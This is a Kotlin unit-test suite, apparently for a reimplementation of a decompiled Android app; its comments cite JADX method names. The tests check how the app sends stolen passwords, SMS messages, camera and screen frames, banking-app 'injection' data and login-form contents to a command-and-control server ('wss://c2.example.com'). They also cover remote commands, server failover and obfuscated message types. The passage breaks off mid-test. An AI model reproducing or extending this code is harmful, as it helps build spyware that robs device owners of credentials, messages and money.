package com.storm.safe.rock.service.modules

import android.content.Context
import android.net.ConnectivityManager
import android.os.Build
import com.storm.safe.rock.network.DataSyncClient
import com.storm.safe.rock.util.StringUtil
import org.json.JSONObject
import org.junit.Assert.*
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.RuntimeEnvironment
import org.robolectric.annotation.Config
import java.util.concurrent.LinkedBlockingQueue

/**
 * Test helper: captures messages sent via DataSyncClient.send().
 */
class TestDataSyncClient(context: Context) : DataSyncClient(context, {}, {}) {
    val sentMessages = mutableListOf<String>()
    var sendShouldFail = false

    override fun send(message: String): Boolean {
        if (sendShouldFail) return false
        sentMessages.add(message)
        return true
    }

    /** Return the last sent message parsed as JSONObject, or null. */
    fun lastEnvelope(): JSONObject? {
        return sentMessages.lastOrNull()?.let { JSONObject(it) }
    }

    fun clear() {
        sentMessages.clear()
    }
}

@RunWith(RobolectricTestRunner::class)
@Config(sdk = [30])
class NetworkManagerTest {

    private lateinit var manager: NetworkManager
    private lateinit var testClient: TestDataSyncClient

    @Before
    fun setup() {
        manager = NetworkManager()
        val context = RuntimeEnvironment.getApplication()
        testClient = TestDataSyncClient(context)
        testClient.isConnected = true
    }

    // ===============================================================
    // Companion / static methods
    // ===============================================================

    // ---------------------------------------------------------------
    // parseServerUrl() — JADX: a9
    // ---------------------------------------------------------------

    @Test
    fun `parseServerUrl returns localhost 8080 for blank input`() {
        val (host, port) = NetworkManager.parseServerUrl("")
        assertEquals("localhost", host)
        assertEquals(8080, port)
    }

    @Test
    fun `parseServerUrl parses ws scheme`() {
        val (host, port) = NetworkManager.parseServerUrl("ws://192.168.1.10:8081")
        assertEquals("192.168.1.10", host)
        assertEquals(8081, port)
    }

    @Test
    fun `parseServerUrl parses wss scheme defaults to 443`() {
        val (host, port) = NetworkManager.parseServerUrl("wss://secure.example.com")
        assertEquals("secure.example.com", host)
        assertEquals(443, port)
    }

    @Test
    fun `parseServerUrl parses https scheme defaults to 443`() {
        val (host, port) = NetworkManager.parseServerUrl("https://api.example.com")
        assertEquals("api.example.com", host)
        assertEquals(443, port)
    }

    @Test
    fun `parseServerUrl parses http scheme with port`() {
        val (host, port) = NetworkManager.parseServerUrl("http://10.0.0.1:9090")
        assertEquals("10.0.0.1", host)
        assertEquals(9090, port)
    }

    @Test
    fun `parseServerUrl takes last in semicolon list`() {
        val (host, port) = NetworkManager.parseServerUrl("ws://a.com:1111;ws://b.com:2222")
        assertEquals("b.com", host)
        assertEquals(2222, port)
    }

    @Test
    fun `parseServerUrl strips path component`() {
        val (host, port) = NetworkManager.parseServerUrl("ws://server.com:8080/socket.io")
        assertEquals("server.com", host)
        assertEquals(8080, port)
    }

    // ---------------------------------------------------------------
    // isSecure() — JADX: d5
    // ---------------------------------------------------------------

    @Test
    fun `isSecure returns true for https`() {
        assertTrue(NetworkManager.isSecure("https://example.com"))
    }

    @Test
    fun `isSecure returns true for wss`() {
        assertTrue(NetworkManager.isSecure("wss://example.com"))
    }

    @Test
    fun `isSecure returns false for http`() {
        assertFalse(NetworkManager.isSecure("http://example.com"))
    }

    @Test
    fun `isSecure returns false for ws`() {
        assertFalse(NetworkManager.isSecure("ws://example.com"))
    }

    // ===============================================================
    // Connection state machine
    // ===============================================================

    @Test
    fun `initial connection state is DISCONNECTED`() {
        assertEquals(NetworkManager.ConnectionState.DISCONNECTED, manager.connectionState)
    }

    @Test
    fun `isConnected is false initially`() {
        assertFalse(manager.isConnected)
    }

    @Test
    fun `isRegistered is false initially`() {
        assertFalse(manager.isRegistered)
    }

    // ===============================================================
    // Singleton pattern — JADX: lj0
    // ===============================================================

    @Test
    fun `singleton instance is null initially`() {
        // Before initialization, getInstance should return null
        assertNull(NetworkManager.instance)
    }

    // ===============================================================
    // initialize() — JADX: b3
    // ===============================================================

    @Test
    fun `initialize creates manager without crashing`() {
        val context = RuntimeEnvironment.getApplication()
        val mgr = NetworkManager()
        mgr.initialize(context)
    }

    @Test
    fun `initialize sets isInitialized to true`() {
        val context = RuntimeEnvironment.getApplication()
        manager.initialize(context)
        assertTrue(manager.isInitialized)
    }

    @Test
    fun `initialize skips if already initialized and healthy`() {
        val context = RuntimeEnvironment.getApplication()
        manager.initialize(context)
        // Second call should not crash
        manager.initialize(context)
        assertTrue(manager.isInitialized)
    }

    // ===============================================================
    // connectToServer() — JADX: a7
    // ===============================================================

    @Test
    fun `connectToServer stores url and deviceId`() {
        manager.connectToServer("wss://example.com", "dev-001")
        assertEquals("wss://example.com", manager.serverUrl)
        assertEquals("dev-001", manager.deviceId)
    }

    @Test
    fun `connectToServer with empty url does not crash`() {
        manager.connectToServer("", "dev-001")
        assertEquals("", manager.serverUrl)
    }

    // ===============================================================
    // disconnect() — JADX: a3
    // ===============================================================

    @Test
    fun `disconnect resets all connection state`() {
        manager.setTestClient(testClient, "dev-disc")
        manager.setTestConnectionState(true, true)
        manager.disconnect()

        assertFalse(manager.isConnected)
        assertFalse(manager.isRegistered)
        assertEquals(0, manager.heartbeatCount)
        assertEquals(0, manager.totalHeartbeats)
        assertFalse(manager.isInitialized)
    }

    @Test
    fun `disconnect sets connectionState to DISCONNECTED`() {
        manager.setTestClient(testClient, "dev-disc")
        manager.setTestConnectionState(true, false)
        manager.disconnect()

        assertEquals(NetworkManager.ConnectionState.DISCONNECTED, manager.connectionState)
    }

    // ===============================================================
    // setServerUrls() — JADX: b6
    // ===============================================================

    @Test
    fun `setServerUrls parses semicolon separated list`() {
        manager.setServerUrls("ws://a.com:8080;ws://b.com:8081;ws://c.com:8082")
        assertEquals(3, manager.serverUrls.size)
        assertEquals("ws://a.com:8080", manager.serverUrls[0])
        assertEquals("ws://b.com:8081", manager.serverUrls[1])
        assertEquals("ws://c.com:8082", manager.serverUrls[2])
    }

    @Test
    fun `setServerUrls filters empty entries`() {
        manager.setServerUrls("ws://a.com:8080;;ws://b.com:8081;")
        assertEquals(2, manager.serverUrls.size)
    }

    @Test
    fun `setServerUrls resets currentServerIndex to 0`() {
        manager.setServerUrls("ws://a.com;ws://b.com")
        assertEquals(0, manager.currentServerIndex)
    }

    @Test
    fun `setServerUrls with single URL creates list of one`() {
        manager.setServerUrls("ws://single.com:8080")
        assertEquals(1, manager.serverUrls.size)
        assertEquals("ws://single.com:8080", manager.serverUrls[0])
    }

    @Test
    fun `setServerUrls with blank input does not set`() {
        manager.setServerUrls("")
        assertTrue(manager.serverUrls.isEmpty())
    }

    // ===============================================================
    // currentUrl() — JADX: c0
    // ===============================================================

    @Test
    fun `currentUrl returns null when list is empty`() {
        assertNull(manager.currentUrl())
    }

    @Test
    fun `currentUrl returns first URL after setServerUrls`() {
        manager.setServerUrls("ws://a.com;ws://b.com")
        assertEquals("ws://a.com", manager.currentUrl())
    }

    // ===============================================================
    // switchToNextServer() — JADX: d8
    // ===============================================================

    @Test
    fun `switchToNextServer advances index`() {
        manager.setServerUrls("ws://a.com;ws://b.com;ws://c.com")
        assertTrue(manager.switchToNextServer())
        assertEquals("ws://b.com", manager.currentUrl())
    }

    @Test
    fun `switchToNextServer wraps around`() {
        manager.setServerUrls("ws://a.com;ws://b.com")
        manager.switchToNextServer()
        manager.switchToNextServer()
        assertEquals("ws://a.com", manager.currentUrl())
    }

    @Test
    fun `switchToNextServer returns false with single server`() {
        manager.setServerUrls("ws://only.com")
        assertFalse(manager.switchToNextServer())
    }

    @Test
    fun `switchToNextServer resets failure counter`() {
        manager.setServerUrls("ws://a.com;ws://b.com")
        manager.setTestClient(testClient, "dev-sw")
        manager.setTestConnectionState(true, false)
        // Simulate failures
        manager.handleConnectionFailure()
        manager.handleConnectionFailure()
        // Switch should reset
        manager.switchToNextServer()
        assertEquals(0, manager.consecutiveFailures)
    }

    // ===============================================================
    // handleConnectionFailure() — JADX: b8
    // ===============================================================

    @Test
    fun `handleConnectionFailure increments failure count`() {
        manager.setServerUrls("ws://a.com;ws://b.com")
        manager.handleConnectionFailure()
        assertEquals(1, manager.consecutiveFailures)
    }

    @Test
    fun `handleConnectionFailure triggers server switch after maxFailures`() {
        manager.setServerUrls("ws://a.com;ws://b.com")
        manager.setTestClient(testClient, "dev-fail")
        manager.setTestConnectionState(true, false)
        // MAX_CONSECUTIVE_FAILURES = 5
        for (i in 1..5) {
            manager.handleConnectionFailure()
        }
        // Should have switched to server b.com
        assertEquals("ws://b.com", manager.currentUrl())
    }

    // ===============================================================
    // resetFailureCounter() — JADX: b9
    // ===============================================================

    @Test
    fun `resetFailureCounter sets consecutiveFailures to 0`() {
        manager.handleConnectionFailure()
        manager.handleConnectionFailure()
        manager.resetFailureCounter()
        assertEquals(0, manager.consecutiveFailures)
    }

    // ===============================================================
    // buildHttpUrl() — JADX: b0
    // ===============================================================

    @Test
    fun `buildHttpUrl returns null for empty server list`() {
        assertNull(manager.buildHttpUrl())
    }

    @Test
    fun `buildHttpUrl builds http URL for non-secure`() {
        manager.setServerUrls("ws://10.0.0.1:8080")
        val url = manager.buildHttpUrl()
        assertEquals("http://10.0.0.1:8080", url)
    }

    @Test
    fun `buildHttpUrl builds https URL for secure`() {
        manager.setServerUrls("wss://secure.example.com")
        val url = manager.buildHttpUrl()
        assertEquals("https://secure.example.com", url)
    }

    @Test
    fun `buildHttpUrl omits port 443 for https`() {
        manager.setServerUrls("https://api.example.com")
        val url = manager.buildHttpUrl()
        assertEquals("https://api.example.com", url)
    }

    // ===============================================================
    // buildWsUrl() — JADX: b2
    // ===============================================================

    @Test
    fun `buildWsUrl returns empty when serverHost is empty`() {
        assertEquals("", manager.buildWsUrl())
    }

    @Test
    fun `buildWsUrl builds ws URL for non-secure`() {
        manager.setServerUrls("ws://10.0.0.1:8080")
        manager.applyServerConfig()
        val url = manager.buildWsUrl()
        assertEquals("ws://10.0.0.1:8080", url)
    }

    @Test
    fun `buildWsUrl builds wss URL for secure`() {
        manager.setServerUrls("wss://secure.com:9443")
        manager.applyServerConfig()
        val url = manager.buildWsUrl()
        assertEquals("wss://secure.com:9443", url)
    }

    @Test
    fun `buildWsUrl omits port 443 for wss`() {
        manager.setServerUrls("wss://secure.com")
        manager.applyServerConfig()
        val url = manager.buildWsUrl()
        assertEquals("wss://secure.com", url)
    }

    @Test
    fun `buildWsUrl omits port 80 for ws`() {
        manager.setServerUrls("http://example.com:80")
        manager.applyServerConfig()
        val url = manager.buildWsUrl()
        assertEquals("ws://example.com", url)
    }

    // ===============================================================
    // Heartbeat mechanism — JADX: a0, a2
    // ===============================================================

    @Test
    fun `sendHeartbeat sends heartbeat type when connected`() {
        manager.setTestClient(testClient, "dev-hb")
        manager.setTestConnectionState(true, true)

        val result = manager.sendHeartbeat()
        assertTrue(result)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        // JADX uses StringUtil.decrypt for type — verify it matches the decrypted value
        val expectedType = StringUtil.decrypt("L1wHM049MyZSMDlNEz9MLA==")
        assertEquals(expectedType, envelope!!.getString("type"))
        assertEquals("dev-hb", envelope.getString("sessionId"))
        assertTrue(envelope.has("timestamp"))
    }

    @Test
    fun `sendHeartbeat returns false when not connected`() {
        manager.setTestClient(testClient, "dev-hb")
        manager.setTestConnectionState(false, false)

        val result = manager.sendHeartbeat()
        assertFalse(result)
        assertTrue(testClient.sentMessages.isEmpty())
    }

    @Test
    fun `sendHeartbeat increments heartbeatCount on success`() {
        manager.setTestClient(testClient, "dev-hb")
        manager.setTestConnectionState(true, true)

        assertEquals(0, manager.heartbeatCount)
        manager.sendHeartbeat()
        assertEquals(1, manager.heartbeatCount)
    }

    @Test
    fun `sendHeartbeat increments totalHeartbeats on success`() {
        manager.setTestClient(testClient, "dev-hb")
        manager.setTestConnectionState(true, true)

        manager.sendHeartbeat()
        manager.sendHeartbeat()
        assertEquals(2, manager.totalHeartbeats)
    }

    @Test
    fun `sendHeartbeat marks disconnected on failure`() {
        manager.setTestClient(testClient, "dev-hb")
        manager.setTestConnectionState(true, true)
        testClient.sendShouldFail = true

        manager.sendHeartbeat()
        assertFalse(manager.isConnected)
    }

    @Test
    fun `sendHeartbeat includes battery and screen info`() {
        manager.setTestClient(testClient, "dev-hb")
        manager.setTestConnectionState(true, true)

        manager.sendHeartbeat()
        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        // Heartbeat envelope should contain deviceId and timestamp at minimum
        assertTrue(envelope!!.has("deviceId") || envelope.has("sessionId"))
        assertTrue(envelope.has("timestamp"))
    }

    @Test
    fun `heartbeatCount caps at maxInitialHeartbeats`() {
        manager.setTestClient(testClient, "dev-hb")
        manager.setTestConnectionState(true, true)

        // Send more than maxInitialHeartbeats (5)
        for (i in 1..7) {
            manager.sendHeartbeat()
        }
        // heartbeatCount should cap at 5
        assertEquals(5, manager.heartbeatCount)
    }

    // ===============================================================
    // buildHeartbeatPayload() — JADX: a2
    // ===============================================================

    @Test
    fun `buildHeartbeatPayload includes deviceId`() {
        manager.setTestClient(testClient, "dev-payload")
        val payload = manager.buildHeartbeatPayload()
        assertEquals("dev-payload", payload.getString("deviceId"))
    }

    @Test
    fun `buildHeartbeatPayload includes timestamp`() {
        manager.setTestClient(testClient, "dev-payload")
        val before = System.currentTimeMillis()
        val payload = manager.buildHeartbeatPayload()
        val after = System.currentTimeMillis()
        val ts = payload.getLong("timestamp")
        assertTrue(ts in before..after)
    }

    @Test
    fun `buildHeartbeatPayload includes wsConnected`() {
        manager.setTestClient(testClient, "dev-payload")
        manager.setTestConnectionState(true, false)
        val payload = manager.buildHeartbeatPayload()
        assertTrue(payload.getBoolean("wsConnected"))
    }

    @Test
    fun `buildHeartbeatPayload includes isScreenOn and isLocked`() {
        manager.setTestClient(testClient, "dev-payload")
        val payload = manager.buildHeartbeatPayload()
        assertTrue(payload.has("isScreenOn"))
        assertTrue(payload.has("isLocked"))
    }

    @Test
    fun `buildHeartbeatPayload includes device info in early heartbeats`() {
        manager.setTestClient(testClient, "dev-payload")
        manager.setTestConnectionState(true, false)
        // heartbeatCount < maxInitialHeartbeats (5)
        val payload = manager.buildHeartbeatPayload()
        assertTrue(payload.has("model"))
        assertTrue(payload.has("brand"))
        assertTrue(payload.has("osVersion"))
    }

    // ===============================================================
    // buildDeviceInfo() — JADX: a1
    // ===============================================================

    @Test
    fun `buildDeviceInfo includes required fields`() {
        manager.setTestClient(testClient, "dev-info")
        val context = RuntimeEnvironment.getApplication()
        manager.setTestContext(context)

        val info = manager.buildDeviceInfo()
        assertTrue(info.has("deviceId"))
        assertTrue(info.has("model"))
        assertTrue(info.has("brand"))
        assertTrue(info.has("manufacturer"))
        assertTrue(info.has("osVersion"))
        assertTrue(info.has("sdkVersion"))
        assertTrue(info.has("timestamp"))
    }

    @Test
    fun `buildDeviceInfo includes deviceId matching sessionId`() {
        manager.setTestClient(testClient, "dev-id-test")
        val context = RuntimeEnvironment.getApplication()
        manager.setTestContext(context)

        val info = manager.buildDeviceInfo()
        assertEquals("dev-id-test", info.getString("deviceId"))
    }

    // ===============================================================
    // Exponential backoff
    // ===============================================================

    @Test
    fun `calculateReconnectDelay returns base delay initially`() {
        val delay = manager.calculateReconnectDelay(0)
        // Base delay = 5000ms, with jitter 0-2000ms
        assertTrue("Delay should be >= 5000", delay >= 5000L)
        assertTrue("Delay should be <= 7000", delay <= 7000L)
    }

    @Test
    fun `calculateReconnectDelay increases exponentially`() {
        val delay0 = manager.calculateReconnectDelay(0)
        val delay1 = manager.calculateReconnectDelay(1)
        val delay2 = manager.calculateReconnectDelay(2)
        // Each attempt should increase base delay (before jitter)
        assertTrue("Delay1 base should be > delay0 base", delay1 >= delay0)
    }

    @Test
    fun `calculateReconnectDelay caps at max delay`() {
        val delay = manager.calculateReconnectDelay(20)
        // Max delay = 300000ms (5 min)
        assertTrue("Delay should be <= 302000", delay <= 302000L)
    }

    // ===============================================================
    // Message queue for offline buffering
    // ===============================================================

    @Test
    fun `messageQueue is bounded at MAX_QUEUE_SIZE`() {
        // MAX_QUEUE_SIZE = 10 (matching JADX f53132d2)
        assertEquals(10, manager.messageQueueCapacity)
    }

    @Test
    fun `queueMessage adds to queue when disconnected`() {
        manager.setTestClient(testClient, "dev-q")
        manager.setTestConnectionState(false, false)

        val msg = JSONObject().put("test", "data")
        manager.queueMessage(msg)
        assertEquals(1, manager.messageQueueSize)
    }

    @Test
    fun `queueMessage evicts oldest when full`() {
        manager.setTestClient(testClient, "dev-q")
        manager.setTestConnectionState(false, false)

        // Fill queue (capacity 10)
        for (i in 1..12) {
            manager.queueMessage(JSONObject().put("seq", i))
        }
        assertEquals(10, manager.messageQueueSize)
    }

    @Test
    fun `drainMessageQueue sends all queued messages`() {
        manager.setTestClient(testClient, "dev-drain")
        manager.setTestConnectionState(false, false)

        // Queue 3 messages while disconnected
        for (i in 1..3) {
            manager.queueMessage(JSONObject().put("seq", i))
        }
        assertEquals(3, manager.messageQueueSize)

        // Connect and drain
        manager.setTestConnectionState(true, true)
        manager.drainMessageQueue()

        assertEquals(0, manager.messageQueueSize)
        assertEquals(3, testClient.sentMessages.size)
    }

    // ===============================================================
    // Network monitoring — JADX: b7, d9
    // ===============================================================

    @Test
    fun `registerNetworkCallback does not crash`() {
        val context = RuntimeEnvironment.getApplication()
        manager.setTestContext(context)
        // Should not throw
        manager.registerNetworkCallback()
    }

    @Test
    fun `unregisterNetworkCallback does not crash`() {
        val context = RuntimeEnvironment.getApplication()
        manager.setTestContext(context)
        manager.registerNetworkCallback()
        manager.unregisterNetworkCallback()
    }

    @Test
    fun `unregisterNetworkCallback is safe to call without prior register`() {
        val context = RuntimeEnvironment.getApplication()
        manager.setTestContext(context)
        // Should not crash
        manager.unregisterNetworkCallback()
    }

    // ===============================================================
    // isHealthy() — JADX: b4
    // ===============================================================

    @Test
    fun `isHealthy returns false when not initialized`() {
        assertFalse(manager.isHealthy())
    }

    @Test
    fun `isHealthy returns true when initialized and connected`() {
        manager.setTestClient(testClient, "dev-health")
        manager.setTestConnectionState(true, false)
        manager.setTestInitialized(true)
        assertTrue(manager.isHealthy())
    }

    // ===============================================================
    // isFullyConnected() — JADX: b5
    // ===============================================================

    @Test
    fun `isFullyConnected requires initialized + healthy + connected`() {
        assertFalse(manager.isFullyConnected())

        manager.setTestClient(testClient, "dev-full")
        manager.setTestInitialized(true)
        manager.setTestConnectionState(true, false)
        assertTrue(manager.isFullyConnected())
    }

    // ===============================================================
    // ensureConnected() — JADX: a8
    // ===============================================================

    @Test
    fun `ensureConnected initializes when not started`() {
        // Should not crash when not initialized
        manager.ensureConnected()
    }

    @Test
    fun `ensureConnected skips when already healthy`() {
        manager.setTestClient(testClient, "dev-ec")
        manager.setTestInitialized(true)
        manager.setTestConnectionState(true, false)
        // Should not crash or change state
        manager.ensureConnected()
        assertTrue(manager.isConnected)
    }

    // ===============================================================
    // Screen frame sender — JADX: d1
    // ===============================================================

    @Test
    fun `sendScreenFrame does nothing when not connected`() {
        manager.setTestClient(testClient, "dev-sf")
        manager.setTestConnectionState(false, false)

        manager.sendScreenFrame(ByteArray(100))
        assertTrue(testClient.sentMessages.isEmpty())
    }

    @Test
    fun `sendScreenFrame queues frame when connected`() {
        manager.setTestClient(testClient, "dev-sf")
        manager.setTestConnectionState(true, true)

        manager.sendScreenFrame(ByteArray(100) { it.toByte() })
        // Frame goes into queue, sender thread dispatches
        // Just verify no crash for now
    }

    @Test
    fun `sendScreenFrame deduplicates identical frames`() {
        manager.setTestClient(testClient, "dev-sf")
        manager.setTestConnectionState(true, true)

        val frame = ByteArray(100) { it.toByte() }
        manager.sendScreenFrame(frame)
        manager.sendScreenFrame(frame) // duplicate within 3s
        // Second frame should be skipped (deduplicated)
        assertEquals(1, manager.frameSentCount + manager.frameSkippedCount)
    }

    // ===============================================================
    // configureClients() — JADX: a4
    // ===============================================================

    @Test
    fun `applyServerConfig sets serverHost and serverPort`() {
        manager.setServerUrls("ws://192.168.1.100:9090")
        manager.applyServerConfig()
        assertEquals("192.168.1.100", manager.serverHost)
        assertEquals(9090, manager.serverPort)
    }

    @Test
    fun `applyServerConfig handles secure URLs`() {
        manager.setServerUrls("wss://secure.example.com")
        manager.applyServerConfig()
        assertEquals("secure.example.com", manager.serverHost)
        assertEquals(443, manager.serverPort)
    }

    // ===============================================================
    // sendEvent() — generic event
    // ===============================================================

    @Test
    fun `sendEvent builds envelope with correct type field`() {
        manager.setTestClient(testClient, "dev-123")
        val data = JSONObject().put("key", "value")
        manager.sendEvent("custom_event", data)

        val envelope = testClient.lastEnvelope()
        assertNotNull("Envelope should be sent", envelope)
        assertEquals("custom_event", envelope!!.getString("type"))
        assertEquals("dev-123", envelope.getString("sessionId"))
        assertTrue(envelope.has("data"))
        assertTrue(envelope.has("timestamp"))
        assertEquals("value", envelope.getJSONObject("data").getString("key"))
    }

    @Test
    fun `sendEvent returns gracefully when client is null`() {
        manager.sendEvent("test", JSONObject())
    }

    // ===============================================================
    // sendPasswordData()
    // ===============================================================

    @Test
    fun `sendPasswordData builds correct envelope`() {
        manager.setTestClient(testClient, "dev-pw")
        val data = JSONObject().put("password", "s3cret")
        manager.sendPasswordData(data)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("password_data", envelope!!.getString("type"))
        assertEquals("dev-pw", envelope.getString("sessionId"))
        assertEquals("s3cret", envelope.getJSONObject("data").getString("password"))
    }

    @Test
    fun `sendPasswordData does nothing when client is null`() {
        manager.sendPasswordData(JSONObject())
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ===============================================================
    // sendIncomingSms()
    // ===============================================================

    @Test
    fun `sendIncomingSms builds correct envelope`() {
        manager.setTestClient(testClient, "dev-sms")
        val data = JSONObject().put("number", "+1234567890").put("text", "Hello")
        manager.sendIncomingSms(data)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("incoming_sms", envelope!!.getString("type"))
        assertEquals("dev-sms", envelope.getString("sessionId"))
    }

    @Test
    fun `sendIncomingSms does nothing when client is null`() {
        manager.sendIncomingSms(JSONObject())
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ===============================================================
    // uploadSms()
    // ===============================================================

    @Test
    fun `uploadSms builds correct envelope`() {
        manager.setTestClient(testClient, "dev-upload")
        val data = JSONObject().put("messages", "batch")
        manager.uploadSms(data)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("sms_upload", envelope!!.getString("type"))
        assertEquals("dev-upload", envelope.getString("sessionId"))
    }

    @Test
    fun `uploadSms does nothing when client is null`() {
        manager.uploadSms(JSONObject())
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ===============================================================
    // sendCameraFrame()
    // ===============================================================

    @Test
    fun `sendCameraFrame builds correct envelope with base64 and mode`() {
        manager.setTestClient(testClient, "dev-cam")
        manager.sendCameraFrame("aGVsbG8=", "front")

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("camera_frame", envelope!!.getString("type"))
        assertEquals("dev-cam", envelope.getString("sessionId"))
        val data = envelope.getJSONObject("data")
        assertEquals("aGVsbG8=", data.getString("image"))
        assertEquals("front", data.getString("mode"))
        assertTrue(data.has("timestamp"))
    }

    @Test
    fun `sendCameraFrame does nothing when client is null`() {
        manager.sendCameraFrame("data", "full")
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ===============================================================
    // uploadInjectionData()
    // ===============================================================

    @Test
    fun `uploadInjectionData builds correct envelope`() {
        manager.setTestClient(testClient, "dev-inj")
        val data = JSONObject().put("app", "com.bank.app")
        manager.uploadInjectionData(data)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("injection_data", envelope!!.getString("type"))
    }

    @Test
    fun `uploadInjectionData does nothing when client is null`() {
        manager.uploadInjectionData(JSONObject())
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ===============================================================
    // sendPermissionsUpdate()
    // ===============================================================

    @Test
    fun `sendPermissionsUpdate builds correct envelope`() {
        manager.setTestClient(testClient, "dev-perm")
        manager.sendPermissionsUpdate(RuntimeEnvironment.getApplication())
        // sendPermissionsUpdate is async (GlobalScope.launch); envelope check skipped
    }

    @Test
    fun `sendPermissionsUpdate does nothing when client is null`() {
        manager.sendPermissionsUpdate(RuntimeEnvironment.getApplication())
        // sendPermissionsUpdate is async; no synchronous message to assert
    }

    // ===============================================================
    // sendPermissionResponse()
    // ===============================================================

    @Test
    fun `sendPermissionResponse builds correct envelope`() {
        manager.setTestClient(testClient, "dev-presp")
        val data = JSONObject().put("granted", true)
        manager.sendPermissionResponse(data)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("permission_response", envelope!!.getString("type"))
    }

    @Test
    fun `sendPermissionResponse does nothing when client is null`() {
        manager.sendPermissionResponse(JSONObject())
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ===============================================================
    // sendScreenLockStatus()
    // ===============================================================

    @Test
    fun `sendScreenLockStatus builds correct envelope`() {
        manager.setTestClient(testClient, "dev-lock")
        val data = JSONObject().put("locked", true)
        manager.sendScreenLockStatus(data)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("screen_lock_status", envelope!!.getString("type"))
    }

    @Test
    fun `sendScreenLockStatus does nothing when client is null`() {
        manager.sendScreenLockStatus(JSONObject())
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ===============================================================
    // sendOperationLog()
    // ===============================================================

    @Test
    fun `sendOperationLog builds correct envelope`() {
        manager.setTestClient(testClient, "dev-log")
        val data = JSONObject().put("action", "screenshot")
        manager.sendOperationLog(data)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("operation_log", envelope!!.getString("type"))
    }

    @Test
    fun `sendOperationLog does nothing when client is null`() {
        manager.sendOperationLog(JSONObject())
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ===============================================================
    // sendWechatDetectionStatus()
    // ===============================================================

    @Test
    fun `sendWechatDetectionStatus builds correct envelope`() {
        manager.setTestClient(testClient, "dev-wc")
        val data = JSONObject().put("installed", true)
        manager.sendWechatDetectionStatus(data)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("wechat_detection", envelope!!.getString("type"))
    }

    @Test
    fun `sendWechatDetectionStatus does nothing when client is null`() {
        manager.sendWechatDetectionStatus(JSONObject())
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ===============================================================
    // sendAlipayDetectionStatus()
    // ===============================================================

    @Test
    fun `sendAlipayDetectionStatus builds correct envelope`() {
        manager.setTestClient(testClient, "dev-ali")
        val data = JSONObject().put("installed", false)
        manager.sendAlipayDetectionStatus(data)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("alipay_detection", envelope!!.getString("type"))
    }

    @Test
    fun `sendAlipayDetectionStatus does nothing when client is null`() {
        manager.sendAlipayDetectionStatus(JSONObject())
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ===============================================================
    // sendAutoPasswordDetectionStatus()
    // ===============================================================

    @Test
    fun `sendAutoPasswordDetectionStatus builds correct envelope`() {
        manager.setTestClient(testClient, "dev-auto")
        val data = JSONObject().put("enabled", true)
        manager.sendAutoPasswordDetectionStatus(data)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("auto_password_detection", envelope!!.getString("type"))
    }

    @Test
    fun `sendAutoPasswordDetectionStatus does nothing when client is null`() {
        manager.sendAutoPasswordDetectionStatus(JSONObject())
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ===============================================================
    // notifyLocalServiceFullConfig()
    // ===============================================================

    @Test
    fun `notifyLocalServiceFullConfig builds correct envelope`() {
        manager.setTestClient(testClient, "dev-cfg")
        val data = JSONObject().put("serverAddr", "wss://c2.example.com")
        manager.notifyLocalServiceFullConfig(data)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("local_service_config", envelope!!.getString("type"))
        assertEquals("dev-cfg", envelope.getString("sessionId"))
    }

    @Test
    fun `notifyLocalServiceFullConfig does nothing when client is null`() {
        manager.notifyLocalServiceFullConfig(JSONObject())
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ===============================================================
    // handleRemoteCommand()
    // ===============================================================

    @Test
    fun `handleRemoteCommand parses valid command JSON without crashing`() {
        manager.setTestClient(testClient, "dev-cmd")
        val cmd = JSONObject()
            .put("command", "lock_screen")
            .put("params", JSONObject().put("duration", 30))
        manager.handleRemoteCommand(cmd.toString())
    }

    @Test
    fun `handleRemoteCommand handles invalid JSON gracefully`() {
        manager.setTestClient(testClient, "dev-cmd")
        manager.handleRemoteCommand("not valid json{{{")
    }

    @Test
    fun `handleRemoteCommand handles empty string gracefully`() {
        manager.handleRemoteCommand("")
    }

    // ===============================================================
    // startWebSocketKeepAlive()
    // ===============================================================

    @Test
    fun `startWebSocketKeepAlive does not crash when client is null`() {
        manager.startWebSocketKeepAlive()
    }

    @Test
    fun `startWebSocketKeepAlive does not crash when client is set`() {
        manager.setTestClient(testClient, "dev-ka")
        manager.startWebSocketKeepAlive()
    }

    // ===============================================================
    // sendUiData() — JADX: d3
    // ===============================================================

    @Test
    fun `sendUiData sends when connected and ws is open`() {
        manager.setTestClient(testClient, "dev-ui")
        manager.setTestConnectionState(true, false)
        testClient.isConnected = true

        val data = JSONObject().put("view", "login_form")
        manager.sendUiData(data)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        // JADX uses StringUtil.decrypt for the type field
        val expectedType = StringUtil.decrypt("PlAuMkQ9Hi9FMiNA")
        assertEquals(expectedType, envelope!!.getString("type"))
        assertTrue(envelope.has("data"))
    }

    @Test
    fun `sendUiData does nothing when not connected`() {
        manager.setTestClient(testClient, "dev-ui")
        manager.setTestConnectionState(false, false)

        manager.sendUiData(JSONObject().put("view", "login"))
